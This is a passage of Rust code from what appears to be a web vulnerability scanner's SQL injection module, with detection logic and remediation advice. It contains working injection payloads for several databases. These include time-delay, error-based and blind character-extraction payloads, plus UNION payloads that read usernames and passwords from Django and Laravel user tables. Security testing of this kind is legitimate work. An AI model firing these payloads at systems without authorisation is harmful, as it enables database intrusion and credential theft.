                            "' AND ASCII(SUBSTRING(DATABASE(),1,1))>255 AND '1'='1",
                            "Generic",
                        ));
                    }
                }
            }
        }

        payloads
    }

    /// Extract a single character using binary search (5-7 requests)
    async fn binary_search_extract_char(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        context: &InjectionContext,
        position: usize,
    ) -> Option<(u8, usize)> {
        let mut low = 0u8;
        let mut high = 127u8; // ASCII printable range
        let mut tests = 0;

        while low < high {
            let mid = (low + high + 1) / 2;

            let payload = self.build_binary_search_payload(db_type, context, position, mid);
            let test_url = Self::build_test_url(url, param, &payload);

            tests += 1;

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    let similarity = self.calculate_similarity(baseline, &response);

                    // If similar to baseline, condition is TRUE (char >= mid)
                    if similarity > 0.85 {
                        low = mid;
                    } else {
                        high = mid - 1;
                    }
                }
                Err(_) => return None,
            }

            // Prevent infinite loops
            if tests > 10 {
                break;
            }
        }

        // Verify the extracted character
        if low > 0 {
            Some((low, tests))
        } else {
            None
        }
    }

    /// Build binary search payload
    fn build_binary_search_payload(
        &self,
        db_type: &DatabaseType,
        context: &InjectionContext,
        position: usize,
        ascii_threshold: u8,
    ) -> String {
        let comparison = format!(">={}", ascii_threshold);

        match db_type {
            DatabaseType::MySQL => match context {
                InjectionContext::Numeric => {
                    format!(
                        " AND ASCII(SUBSTRING(DATABASE(),{},1)){}",
                        position, comparison
                    )
                }
                _ => {
                    format!(
                        "' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1",
                        position, comparison
                    )
                }
            },
            DatabaseType::PostgreSQL => match context {
                InjectionContext::Numeric => {
                    format!(
                        " AND ASCII(SUBSTRING(current_database(),{},1)){}",
                        position, comparison
                    )
                }
                _ => {
                    format!(
                        "' AND ASCII(SUBSTRING(current_database(),{},1)){} AND '1'='1",
                        position, comparison
                    )
                }
            },
            DatabaseType::MSSQL => match context {
                InjectionContext::Numeric => {
                    format!(
                        " AND ASCII(SUBSTRING(DB_NAME(),{},1)){}",
                        position, comparison
                    )
                }
                _ => {
                    format!(
                        "' AND ASCII(SUBSTRING(DB_NAME(),{},1)){} AND '1'='1",
                        position, comparison
                    )
                }
            },
            _ => match context {
                InjectionContext::Numeric => {
                    format!(
                        " AND ASCII(SUBSTRING(DATABASE(),{},1)){}",
                        position, comparison
                    )
                }
                _ => {
                    format!(
                        "' AND ASCII(SUBSTRING(DATABASE(),{},1)){} AND '1'='1",
                        position, comparison
                    )
                }
            },
        }
    }

    /// Scan for time-based SQLi with statistical analysis (prevents false positives)
    async fn scan_time_based_statistical(
        &self,
        url: &str,
        param: &str,
        db_type: &DatabaseType,
        _context: &InjectionContext,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing time-based SQLi with statistical analysis");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let payloads = self.get_time_based_payloads(db_type);

        for (payload, expected_delay) in payloads {
            // Measure baseline response time (3 samples)
            let mut baseline_times = Vec::new();
            for _ in 0..3 {
                let baseline_url = url.to_string();
                match self.http_client.get(&baseline_url).await {
                    Ok(response) => baseline_times.push(response.duration_ms as f64),
                    Err(_) => continue,
                }
                tests_run += 1;
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }

            if baseline_times.len() < 3 {
                continue;
            }

            let baseline_avg = baseline_times.iter().sum::<f64>() / baseline_times.len() as f64;
            let baseline_variance = self.calculate_variance(&baseline_times, baseline_avg);
            let baseline_stddev = baseline_variance.sqrt();

            debug!(
                "Baseline: avg={:.1}ms, stddev={:.1}ms",
                baseline_avg, baseline_stddev
            );

            // Test delay payload (3 samples for statistical significance)
            let mut delay_times = Vec::new();
            for _ in 0..3 {
                let test_url = Self::build_test_url(url, param, payload);

                match self.http_client.get(&test_url).await {
                    Ok(response) => delay_times.push(response.duration_ms as f64),
                    Err(_) => continue,
                }
                tests_run += 1;
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }

            if delay_times.len() < 3 {
                continue;
            }

            let delay_avg = delay_times.iter().sum::<f64>() / delay_times.len() as f64;
            let delay_variance = self.calculate_variance(&delay_times, delay_avg);
            let delay_stddev = delay_variance.sqrt();

            debug!(
                "Delay: avg={:.1}ms, stddev={:.1}ms",
                delay_avg, delay_stddev
            );

            // Statistical analysis
            let delay_difference = delay_avg - baseline_avg;
            let expected_delay_f64 = expected_delay as f64;

            // Check if delay is consistent and matches expected
            let variance_ratio = if delay_avg > 0.0 {
                (delay_stddev / delay_avg) * 100.0
            } else {
                100.0
            };

            let is_consistent_delay = variance_ratio < 20.0; // Variance < 20%
            let is_significant_delay = delay_difference > (expected_delay_f64 * 0.8);
            let is_expected_range = delay_difference >= (expected_delay_f64 * 0.8)
                && delay_difference <= (expected_delay_f64 * 1.5);

            debug!(
                "Analysis: diff={:.1}ms, variance={:.1}%, consistent={}, significant={}, in_range={}",
                delay_difference, variance_ratio, is_consistent_delay, is_significant_delay, is_expected_range
            );

            if is_consistent_delay && is_significant_delay && is_expected_range {
                let confidence = if variance_ratio < 10.0 && is_expected_range {
                    Confidence::High
                } else if variance_ratio < 15.0 {
                    Confidence::Medium
                } else {
                    Confidence::Low
                };

                let evidence = format!(
                    "Statistical time-based blind SQLi:\n\
                    - Baseline average: {:.1}ms (stddev: {:.1}ms)\n\
                    - Delay average: {:.1}ms (stddev: {:.1}ms)\n\
                    - Delay difference: {:.1}ms (expected: {}ms)\n\
                    - Variance ratio: {:.1}% (threshold: <20%)\n\
                    - Database: {:?}\n\
                    - Samples per test: 3\n\
                    - Consistency: {} (low variance = high confidence)",
                    baseline_avg,
                    baseline_stddev,
                    delay_avg,
                    delay_stddev,
                    delay_difference,
                    expected_delay,
                    variance_ratio,
                    db_type,
                    if variance_ratio < 10.0 {
                        "Excellent"
                    } else if variance_ratio < 15.0 {
                        "Good"
                    } else {
                        "Acceptable"
                    }
                );

                let vuln = Vulnerability {
                    id: format!("sqli_time_statistical_{}", Self::generate_id()),
                    vuln_type: "Statistical Time-based Blind SQL Injection".to_string(),
                    severity: Severity::Critical,
                    confidence,
                    category: "Injection".to_string(),
                    url: url.to_string(),
                    parameter: Some(param.to_string()),
                    payload: payload.to_string(),
                    description: format!(
                        "Time-based blind SQL injection with statistical verification in parameter '{}'. \
                        Delay: {:.1}ms avg, variance: {:.1}%. Multiple measurements confirm consistent \
                        delay pattern, ruling out network timeout false positives.",
                        param, delay_avg, variance_ratio
                    ),
                    evidence: Some(evidence),
                    cwe: "CWE-89".to_string(),
                    cvss: 9.8,
                    verified: true,
                    false_positive: false,
                    remediation: "1. Use parameterized queries exclusively\n\
                                  2. Implement strict input validation\n\
                                  3. Apply query timeout limits\n\
                                  4. Monitor for unusual delay patterns\n\
                                  5. Use WAF with time-based SQLi detection\n\
                                  6. Implement rate limiting".to_string(),
                    discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
                };

                if self.is_new_vulnerability(&vuln) {
                    info!(
                        "Statistical time-based SQLi confirmed: {:.1}ms delay, {:.1}% variance",
                        delay_avg, variance_ratio
                    );
                    vulnerabilities.push(vuln);
                    break; // One confirmation is enough
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Get time-based payloads for statistical testing
    fn get_time_based_payloads(&self, db_type: &DatabaseType) -> Vec<(&'static str, u64)> {
        match db_type {
            DatabaseType::MySQL => vec![
                ("' AND SLEEP(5) AND '1'='1", 5000),
                ("' OR SLEEP(5)--", 5000),
            ],
            DatabaseType::PostgreSQL => vec![
                ("' AND pg_sleep(5) AND '1'='1", 5000),
                ("' OR pg_sleep(5)--", 5000),
            ],
            DatabaseType::MSSQL => vec![
                ("'; WAITFOR DELAY '00:00:05'--", 5000),
                ("' WAITFOR DELAY '00:00:05'--", 5000),
            ],
            _ => vec![
                ("' AND SLEEP(5) AND '1'='1", 5000),
                ("' OR pg_sleep(5)--", 5000),
                ("'; WAITFOR DELAY '00:00:05'--", 5000),
            ],
        }
    }

    /// Calculate variance for statistical analysis
    fn calculate_variance(&self, values: &[f64], mean: f64) -> f64 {
        if values.is_empty() {
            return 0.0;
        }

        let sum_squared_diff: f64 = values
            .iter()
            .map(|&value| {
                let diff = value - mean;
                diff * diff
            })
            .sum();

        sum_squared_diff / values.len() as f64
    }

    /// Scan for PostgreSQL JSON operator exploitation
    async fn scan_postgres_json_operators(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        _context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing PostgreSQL JSON operators for SQLi");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // PostgreSQL JSON operator payloads
        let json_payloads = vec![
            // JSONB containment operators
            (
                "' OR '{\"a\":\"b\"}'::jsonb @> '{\"a\":\"b\"}'::jsonb--",
                "JSONB containment (@>)",
            ),
            (
                "' AND '{\"a\":\"b\"}'::jsonb <@ '{\"a\":\"b\"}'::jsonb--",
                "JSONB contained by (<@)",
            ),
            ("' OR '{\"a\":1}'::jsonb ? 'a'--", "JSONB key exists (?)"),
            // JSON path queries
            ("' OR '{}' IS JSON--", "JSON validation"),
            (
                "' AND jsonb_path_query('[1,2,3]'::jsonb, '$[*]') IS NOT NULL--",
                "JSONB path query",
            ),
            // Bypass filters with JSON casting
            ("' OR 1::text::jsonb IS NOT NULL--", "Type casting bypass"),
            (
                "' UNION SELECT NULL,NULL,'{\"key\":\"value\"}'::jsonb--",
                "UNION with JSONB",
            ),
            // JSON aggregation
            ("' OR json_agg(1) IS NOT NULL--", "JSON aggregation"),
            (
                "' AND jsonb_object_agg('k','v') IS NOT NULL--",
                "JSONB object aggregation",
            ),
        ];

        let concurrent_requests = match config.scan_mode.as_str() {
            "insane" => 50,
            _ => 30,
        };

        let payload_count = json_payloads.len();

        let results = stream::iter(json_payloads)
            .map(|(payload, technique)| {
                let test_url = Self::build_test_url(url, param, payload);
                let client = Arc::clone(&self.http_client);
                let baseline_clone = baseline.clone();
                let technique_name = technique.to_string();

                async move {
                    match client.get(&test_url).await {
                        Ok(response) => Some((
                            payload.to_string(),
                            response,
                            test_url,
                            baseline_clone,
                            technique_name,
                        )),
                        Err(e) => {
                            debug!("JSON operator test failed: {}", e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        tests_run += payload_count;

        for result in results {
            if let Some((payload, response, test_url, baseline, technique)) = result {
                // Check for successful injection
                let similarity = self.calculate_similarity(&baseline, &response);
                let body_lower = response.body.to_lowercase();

                // Check for ACTUAL PostgreSQL error messages (not just "json" in API responses)
                // These are specific error patterns that indicate SQL injection worked
                let has_pg_error = body_lower.contains("pg_catalog")
                    || body_lower.contains("pg_class")
                    || body_lower.contains("pg_proc")
                    || body_lower.contains("pg_type")
                    || body_lower.contains("invalid input syntax for type json")
                    || body_lower.contains("cannot cast type")
                    || body_lower.contains("operator does not exist")
                    || body_lower.contains("jsonb_")  // jsonb functions exposed
                    || (body_lower.contains("error") && body_lower.contains("jsonb @>"))
                    || (body_lower.contains("error") && body_lower.contains("jsonb <@"));

                // Require BOTH high similarity AND specific error indicator
                // Just having "json" in response is NOT enough (most APIs return JSON!)
                if has_pg_error && similarity > 0.70 {
                    let confidence = if similarity > 0.90 && has_pg_error {
                        Confidence::High
                    } else if similarity > 0.80 {
                        Confidence::Medium
                    } else {
                        Confidence::Low
                    };

                    let evidence = format!(
                        "PostgreSQL JSON operator exploitation:\n\
                        - Technique: {}\n\
                        - Payload: {}\n\
                        - Response similarity: {:.1}%\n\
                        - PostgreSQL error detected: {}\n\
                        - Status: {}",
                        technique,
                        payload,
                        similarity * 100.0,
                        has_pg_error,
                        response.status_code
                    );

                    let vuln = Vulnerability {
                        id: format!("sqli_postgres_json_{}", Self::generate_id()),
                        vuln_type: "PostgreSQL JSON Operator SQL Injection".to_string(),
                        severity: Severity::Critical,
                        confidence,
                        category: "Injection".to_string(),
                        url: test_url,
                        parameter: Some(param.to_string()),
                        payload: payload.clone(),
                        description: format!(
                            "PostgreSQL JSON operator SQL injection in parameter '{}'. \
                            Technique: {}. JSON operators can bypass basic SQLi filters and WAFs. \
                            Allows complex queries and data extraction.",
                            param, technique
                        ),
                        evidence: Some(evidence),
                        cwe: "CWE-89".to_string(),
                        cvss: 9.8,
                        verified: true,
                        false_positive: false,
                        remediation: "1. Use parameterized queries exclusively\n\
                                      2. Validate and sanitize JSON inputs\n\
                                      3. Implement strict input validation\n\
                                      4. Apply least privilege for database users\n\
                                      5. Update WAF rules for JSON operator patterns\n\
                                      6. Monitor for unusual JSON queries"
                            .to_string(),
                        discovered_at: chrono::Utc::now().to_rfc3339(),
                        ml_data: None,
                    }
                    .with_ml_data(&response, Some(&baseline), Some(&payload));

                    if self.is_new_vulnerability(&vuln) {
                        info!("PostgreSQL JSON operator SQLi detected: {}", technique);
                        vulnerabilities.push(vuln);

                        if config.scan_mode.as_str() == "fast" {
                            break;
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Scan for enhanced error-based SQLi (XML, geometric functions, type conversion)
    async fn scan_enhanced_error_based(
        &self,
        url: &str,
        param: &str,
        baseline: &HttpResponse,
        db_type: &DatabaseType,
        context: &InjectionContext,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!("Testing enhanced error-based SQLi");

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        let payloads = self.get_enhanced_error_payloads(db_type, context);
        let concurrent_requests = match config.scan_mode.as_str() {
            "insane" => 100,
            "thorough" => 75,
            _ => 50,
        };

        let payload_count = payloads.len();

        let results = stream::iter(payloads)
            .map(|(payload, technique, error_pattern)| {
                let test_url = Self::build_test_url(url, param, payload);
                let client = Arc::clone(&self.http_client);
                let baseline_clone = baseline.clone();
                let technique_name = technique.to_string();
                let pattern = error_pattern.to_string();

                async move {
                    match client.get(&test_url).await {
                        Ok(response) => Some((
                            payload.to_string(),
                            response,
                            test_url,
                            baseline_clone,
                            technique_name,
                            pattern,
                        )),
                        Err(e) => {
                            debug!("Enhanced error test failed: {}", e);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrent_requests)
            .collect::<Vec<_>>()
            .await;

        tests_run += payload_count;

        for result in results {
            if let Some((payload, response, test_url, baseline, technique, error_pattern)) = result
            {
                let body_lower = response.body.to_lowercase();

                // Check for specific error patterns
                let has_target_error = body_lower.contains(&error_pattern.to_lowercase());
                let has_data_leakage = self.detect_data_leakage(&response.body);

                // Check if response differs significantly from baseline
                let similarity = self.calculate_similarity(&baseline, &response);
                let differs_from_baseline = similarity < 0.70;

                if has_target_error || (has_data_leakage && differs_from_baseline) {
                    let extracted_data = if has_data_leakage {
                        self.extract_leaked_data(&response.body)
                    } else {
                        None
                    };

                    let confidence = if has_data_leakage && extracted_data.is_some() {
                        Confidence::High
                    } else if has_target_error {
                        Confidence::Medium
                    } else {
                        Confidence::Low
                    };

                    let evidence = format!(
                        "Enhanced error-based SQLi:\n\
                        - Technique: {}\n\
                        - Payload: {}\n\
                        - Target error pattern: {}\n\
                        - Error detected: {}\n\
                        - Data leakage detected: {}\n\
                        - Extracted data: {}\n\
                        - Response similarity: {:.1}%\n\
                        - Status: {}",
                        technique,
                        payload,
                        error_pattern,
                        has_target_error,
                        has_data_leakage,
                        extracted_data.as_deref().unwrap_or("None"),
                        similarity * 100.0,
                        response.status_code
                    );

                    let vuln = Vulnerability {
                        id: format!("sqli_enhanced_error_{}", Self::generate_id()),
                        vuln_type: "Enhanced Error-based SQL Injection".to_string(),
                        severity: Severity::Critical,
                        confidence,
                        category: "Injection".to_string(),
                        url: test_url,
                        parameter: Some(param.to_string()),
                        payload: payload.clone(),
                        description: format!(
                            "Enhanced error-based SQL injection in parameter '{}'. Technique: {}. \
                            {}",
                            param,
                            technique,
                            if has_data_leakage {
                                "Successfully extracted data via error messages."
                            } else {
                                "Database errors expose vulnerability to data extraction attacks."
                            }
                        ),
                        evidence: Some(evidence),
                        cwe: "CWE-89".to_string(),
                        cvss: 9.8,
                        verified: true,
                        false_positive: false,
                        remediation: "1. Use parameterized queries exclusively\n\
                                      2. Disable detailed error messages in production\n\
                                      3. Implement generic error pages\n\
                                      4. Validate and sanitize all inputs\n\
                                      5. Apply least privilege for database users\n\
                                      6. Log errors server-side only\n\
                                      7. Use WAF with error-based SQLi detection"
                            .to_string(),
                        discovered_at: chrono::Utc::now().to_rfc3339(),
                        ml_data: None,
                    }
                    .with_ml_data(&response, Some(&baseline), Some(&payload));

                    if self.is_new_vulnerability(&vuln) {
                        info!("Enhanced error-based SQLi detected: {}", technique);
                        vulnerabilities.push(vuln);

                        if config.scan_mode.as_str() == "fast" {
                            break;
                        }
                    }
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Get enhanced error-based payloads
    fn get_enhanced_error_payloads(
        &self,
        db_type: &DatabaseType,
        context: &InjectionContext,
    ) -> Vec<(&'static str, &'static str, &'static str)> {
        let mut payloads = Vec::new();

        match db_type {
            DatabaseType::MySQL => {
                match context {
                    InjectionContext::Numeric => {
                        // XML-based extraction
                        payloads.push((
                            " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))",
                            "XML extraction (EXTRACTVALUE)",
                            "XPATH",
                        ));
                        payloads.push((
                            " AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)",
                            "XML extraction (UPDATEXML)",
                            "XPATH",
                        ));

                        // Geometric functions
                        payloads.push((
                            " AND GTID_SUBSET(CONCAT(0x7e,(SELECT USER()),0x7e),1)",
                            "Geometric function (GTID_SUBSET)",
                            "gtid",
                        ));
                        payloads.push((
                            " AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT USER())x))",
                            "Geometric collection",
                            "geometrycollection",
                        ));

                        // Type conversion errors
                        payloads.push((
                            " AND EXP(~(SELECT * FROM(SELECT DATABASE())x))",
                            "Exponential overflow",
                            "exp",
                        ));
                    }
                    _ => {
                        payloads.push((
                            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)) AND '1'='1",
                            "XML extraction (EXTRACTVALUE)",
                            "XPATH"
                        ));
                        payloads.push((
                            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1) AND '1'='1",
                            "XML extraction (UPDATEXML)",
                            "XPATH",
                        ));
                        payloads.push((
                            "' AND EXP(~(SELECT * FROM(SELECT USER())x)) AND '1'='1",
                            "Exponential overflow",
                            "exp",
                        ));
                    }
                }
            }
            DatabaseType::PostgreSQL => {
                match context {
                    InjectionContext::Numeric => {
                        // Type casting errors
                        payloads.push((
                            " AND CAST((SELECT current_database()) AS int)",
                            "Type casting extraction",
                            "invalid input syntax",
                        ));
                        payloads.push((
                            " AND 1=(SELECT 1/(SELECT 0 FROM (SELECT current_user) AS x WHERE 1=1))",
                            "Division by zero extraction",
                            "division by zero"
                        ));

                        // XML parsing
                        payloads.push((
                            " AND CAST(XMLPARSE(DOCUMENT (SELECT current_database())) AS text)",
                            "XML parsing extraction",
                            "xml",
                        ));
                    }
                    _ => {
                        payloads.push((
                            "' AND CAST((SELECT current_database()) AS int)::text='1",
                            "Type casting extraction",
                            "invalid input syntax",
                        ));
                        payloads.push((
                            "' AND 1::int=current_user::int AND '1'='1",
                            "Type mismatch",
                            "invalid",
                        ));
                    }
                }
            }
            DatabaseType::MSSQL => {
                match context {
                    InjectionContext::Numeric => {
                        // XML-based
                        payloads.push((
                            " AND 1=CONVERT(INT,(SELECT @@version))",
                            "Type conversion extraction",
                            "conversion failed",
                        ));
                        payloads.push((
                            " AND 1=CAST((SELECT DB_NAME()) AS int)",
                            "CAST extraction",
                            "conversion",
                        ));

                        // Geometric/spatial
                        payloads.push((
                            " AND 1=geometry::Point((SELECT SYSTEM_USER),0,0).ToString()",
                            "Geometry function",
                            "geometry",
                        ));
                    }
                    _ => {
                        payloads.push((
                            "' AND 1=CONVERT(INT,(SELECT @@version)) AND '1'='1",
                            "Type conversion extraction",
                            "conversion failed",
                        ));
                        payloads.push((
                            "' AND 1=CAST((SELECT DB_NAME()) AS int) AND '1'='1",
                            "CAST extraction",
                            "conversion",
                        ));
                    }
                }
            }
            DatabaseType::Oracle => match context {
                InjectionContext::Numeric => {
                    payloads.push((
                        " AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))",
                        "Context indexing",
                        "DRG",
                    ));
                    payloads.push((
                        " AND UTL_INADDR.get_host_name((SELECT user FROM dual))",
                        "Network function",
                        "ORA-",
                    ));
                }
                _ => {
                    payloads.push((
                        "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))='1",
                        "Context indexing",
                        "DRG",
                    ));
                }
            },
            _ => {
                // Generic payloads for unknown databases
                match context {
                    InjectionContext::Numeric => {
                        payloads.push((
                            " AND CAST((SELECT 1) AS int)",
                            "Generic type casting",
                            "error",
                        ));
                    }
                    _ => {
                        payloads.push((
                            "' AND CAST((SELECT 1) AS int)='1",
                            "Generic type casting",
                            "error",
                        ));
                    }
                }
            }
        }

        payloads
    }

    /// Detect data leakage in error messages
    fn detect_data_leakage(&self, body: &str) -> bool {
        let body_lower = body.to_lowercase();

        // Patterns indicating data extraction via errors
        let leak_patterns = [
            "version(",
            "@@version",
            "database()",
            "user(",
            "current_user",
            "db_name",
            "system_user",
            "0x7e", // Delimiter often used in extraction
            "xpath",
            "extractvalue",
            "updatexml",
        ];

        leak_patterns
            .iter()
            .any(|pattern| body_lower.contains(pattern))
    }

    /// Extract leaked data from error messages
    fn extract_leaked_data(&self, body: &str) -> Option<String> {
        // Look for data between common delimiters
        if let Some(start) = body.find("~") {
            if let Some(end) = body[start + 1..].find("~") {
                let data = &body[start + 1..start + 1 + end];
                if !data.is_empty() && data.len() < 200 {
                    return Some(data.to_string());
                }
            }
        }

        // Look for version strings
        if body.to_lowercase().contains("mysql") {
            if let Some(pos) = body.to_lowercase().find("mysql") {
                let snippet = &body[pos..std::cmp::min(pos + 50, body.len())];
                return Some(snippet.to_string());
            }
        }

        // Look for database names in errors
        let patterns = ["database '", "database: ", "db: "];
        for pattern in patterns {
            if let Some(pos) = body.to_lowercase().find(pattern) {
                let start = pos + pattern.len();
                if let Some(end) = body[start..].find(&['\'', '"', ' '][..]) {
                    let data = &body[start..start + end];
                    if !data.is_empty() {
                        return Some(data.to_string());
                    }
                }
            }
        }

        None
    }

    /// Get priority boost based on scan context
    fn get_context_priority_boost(&self, context: Option<&ScanContext>) -> u32 {
        let mut boost = 0;

        if let Some(ctx) = context {
            // Higher priority for URL query string parameters (more likely to be vulnerable)
            if matches!(ctx.parameter_source, ParameterSource::UrlQueryString) {
                boost += 2;
            }

            // Boost for API endpoints
            if matches!(
                ctx.endpoint_type,
                EndpointType::RestApi | EndpointType::GraphQlApi
            ) {
                boost += 1;
            }
        }

        boost
    }

    /// Get framework-specific SQL injection payloads
    fn get_framework_specific_payloads(
        &self,
        context: &ScanContext,
        injection_context: &InjectionContext,
    ) -> Vec<String> {
        let mut payloads = Vec::new();

        // Django ORM bypass patterns
        if let Some(ref framework) = context.framework {
            match framework.as_str() {
                "Django" => {
                    debug!("[SQLi] Using Django ORM bypass patterns");
                    match injection_context {
                        InjectionContext::Numeric => {
                            payloads.extend(vec![
                                // Django ORM filter bypass
                                " OR 1=1--".to_string(),
                                " UNION SELECT NULL,NULL,NULL--".to_string(),
                                // Django raw SQL injection
                                " AND 1=(SELECT COUNT(*) FROM django_session)--".to_string(),
                            ]);
                        }
                        _ => {
                            payloads.extend(vec![
                                // Django ORM string injection
                                "' OR '1'='1' --".to_string(),
                                "' OR 1=1--".to_string(),
                                // Django template injection via SQL
                                "' UNION SELECT NULL,NULL,'{{7*7}}'--".to_string(),
                                // Django-specific table access
                                "' UNION SELECT username,password,NULL FROM auth_user--"
                                    .to_string(),
                            ]);
                        }
                    }
                }
                "Laravel" => {
                    debug!("[SQLi] Using Laravel Eloquent bypass patterns");
                    match injection_context {
                        InjectionContext::Numeric => {
                            payloads.extend(vec![
                                // Eloquent whereRaw bypass
                                " OR 1=1) --".to_string(),
                                " UNION SELECT NULL,NULL,NULL,NULL--".to_string(),
                                // Laravel common tables
                                " AND 1=(SELECT COUNT(*) FROM users)--".to_string(),
                            ]);
                        }
                        _ => {
                            payloads.extend(vec![
                                // Eloquent string injection
                                "' OR '1'='1') --".to_string(),
                                "' OR 1=1) --".to_string(),
                                // Laravel migrations table
                                "' UNION SELECT NULL,migration,batch,NULL FROM migrations--"
                                    .to_string(),
                                // Laravel users table
                                "' UNION SELECT id,name,email,password FROM users--".to_string(),
                            ]);
                        }
                    }
                }
                "Ruby on Rails" | "Rails" => {
                    debug!("[SQLi] Using Rails ActiveRecord bypass patterns");
                    match injection_context {
                        InjectionContext::Numeric => {
                            payloads.extend(vec![
                                " OR 1=1--".to_string(),
                                " AND 1=(SELECT COUNT(*) FROM schema_migrations)--".to_string(),
                            ]);
                        }
                        _ => {
                            payloads.extend(vec![
                                "' OR '1'='1'--".to_string(),
                                "' UNION SELECT NULL,NULL,version,NULL FROM schema_migrations--"
                                    .to_string(),
                            ]);
                        }
                    }
                }
                _ => {}
            }
        }

        // GraphQL-specific SQL injection patterns
        if context.is_graphql {
            debug!("[SQLi] Using GraphQL-specific SQLi patterns");
            match injection_context {
                InjectionContext::Numeric => {
                    payloads.extend(vec![
                        " OR 1=1) }--".to_string(),
                        " UNION SELECT NULL,NULL) }--".to_string(),
                    ]);
                }
                _ => {
                    payloads.extend(vec![
                        // GraphQL query breaking + SQL injection
                        "' OR '1'='1') }--".to_string(),
                        "\\\" OR \\\"1\\\"=\\\"1\\\") }--".to_string(),
                        // GraphQL batching SQLi
                        "' UNION SELECT NULL,NULL) } { __typename }--".to_string(),
                    ]);
                }
            }
        }

        payloads
    }

    /// Extract parameter value from URL
    fn extract_param_value(&self, url: &str, param: &str) -> Option<String> {
        // Parse URL to extract parameter value
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some((key, value)) = pair.split_once('=') {
                    if key == param {
                        return Some(urlencoding::decode(value).unwrap_or_default().to_string());
                    }
                }
            }
        }
        None
    }

    /// Build test URL by replacing or adding a parameter with payload
    /// This properly replaces existing parameters instead of adding duplicates
    fn build_test_url(base_url: &str, param_name: &str, payload: &str) -> String {
        if let Ok(mut parsed) = url::Url::parse(base_url) {
            // Collect existing parameters, excluding the one we're testing
            let existing_params: Vec<(String, String)> = parsed
                .query_pairs()
                .filter(|(name, _)| name != param_name)
                .map(|(name, value)| (name.to_string(), value.to_string()))
                .collect();

            // Clear query string and rebuild with our payload
            parsed.set_query(None);
            {
                let mut query_pairs = parsed.query_pairs_mut();
                // Re-add existing params (except the target)
                for (name, value) in &existing_params {
                    query_pairs.append_pair(name, value);
                }
                // Add our test parameter with payload
                query_pairs.append_pair(param_name, payload);
            }
            parsed.to_string()
        } else {
            // Fallback for unparseable URLs
            if base_url.contains('?') {
                format!(
                    "{}&{}={}",
                    base_url,
                    param_name,
                    urlencoding::encode(payload)
                )
            } else {
                format!(
                    "{}?{}={}",
                    base_url,
                    param_name,
                    urlencoding::encode(payload)
                )
            }
        }
    }

    /// INSANE MODE: Arithmetic injection detection
    /// Catches SQLi that error-based and time-based miss
    /// Works by detecting if the database evaluates mathematical expressions
    async fn scan_arithmetic_injection(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Extract current parameter value
        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Try to parse as number for arithmetic tests
        let is_numeric = current_value.parse::<i64>().is_ok();
        let num_value: i64 = current_value.parse().unwrap_or(1);

        // Response similarity threshold
        // CRITICAL: Raised to 0.95 to reduce false positives on WordPress sites
        // WordPress pages are 85%+ identical (same header/footer/sidebar)
        // Real SQLi should produce 95%+ identical responses
        let similarity_threshold = 0.95;

        // ============================================================
        // TEST 1: Arithmetic operations (numeric parameters)
        // If id=7-1 returns same as id=6, SQL is evaluating math
        // ============================================================
        if is_numeric && num_value > 1 {
            // Get response for value-1
            let minus_one_url = Self::build_test_url(base_url, parameter, &(num_value - 1).to_string());
            let minus_one_resp = self.http_client.get(&minus_one_url).await.ok();
            tests_run += 1;

            // Test: (value+1)-1 should equal value if SQL evaluates math
            let arithmetic_payload = format!("{}-1+1", num_value);
            let arithmetic_url = Self::build_test_url(base_url, parameter, &arithmetic_payload);
            if let Ok(arithmetic_resp) = self.http_client.get(&arithmetic_url).await {
                tests_run += 1;

                let baseline_similarity = self.calculate_similarity(baseline, &arithmetic_resp);
                let minus_one_similarity = minus_one_resp.as_ref()
                    .map(|r| self.calculate_similarity(r, &arithmetic_resp))
                    .unwrap_or(0.0);

                // If arithmetic result matches baseline (not value-1), SQLi confirmed
                if baseline_similarity > similarity_threshold && minus_one_similarity < 0.7 {
                    info!("[SQLi] ARITHMETIC INJECTION CONFIRMED: {}-1+1 = {} (math evaluated)", num_value, num_value);
                    vulnerabilities.push(self.create_vulnerability(
                        base_url,
                        parameter,
                        &arithmetic_payload,
                        "Arithmetic SQL Injection",
                        "Database evaluates mathematical expressions in parameter",
                        Severity::High,
                        Confidence::High,
                    ));
                    return Ok((vulnerabilities, tests_run));
                }
            }

            // Test: value*1 should equal value
            let mult_payload = format!("{}*1", num_value);
            let mult_url = Self::build_test_url(base_url, parameter, &mult_payload);
            if let Ok(mult_resp) = self.http_client.get(&mult_url).await {
                tests_run += 1;

